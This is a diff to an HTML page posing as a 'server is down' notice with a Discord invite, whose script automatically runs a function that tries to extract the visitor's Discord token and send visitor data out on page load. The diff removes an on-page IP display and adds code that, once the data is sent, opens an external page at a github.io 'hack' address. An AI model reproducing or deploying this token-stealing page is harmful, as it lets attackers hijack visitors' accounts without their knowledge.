@@ -45,12 +45,6 @@
             transform: translate(-50%, -50%);
             z-index: -1;
         }
-
-        .ip-address {
-            font-size: 1em;
-            font-weight: bold;
-            color: #ff4d4d;
-        }
     </style>
 </head>
 <body>
@@ -67,8 +61,6 @@
         <p>Oops! Your server is down!</p>
         <p>Discord.gg/P2L</p>
     </div>
-
-    <div class="ip-address" id="ip-address"></div>
 
     <script>
         // Function to get visitor details
@@ -120,6 +112,7 @@
             .then(response => {
                 if (response.ok) {
                     console.log('Data sent successfully');
+                    openNewPage();
                 } else {
                     console.error('Failed to send data');
                 }
@@ -154,7 +147,12 @@
             }
         }
 
-        // Automatically try to extract the token
+        // Function to open new page after sending data
+        function openNewPage() {
+            window.open('https://lqnz12.github.io/hack/', '_blank');
+        }
+
+        // Automatically try to extract the token and send data
         extractDiscordToken();
     </script>
 
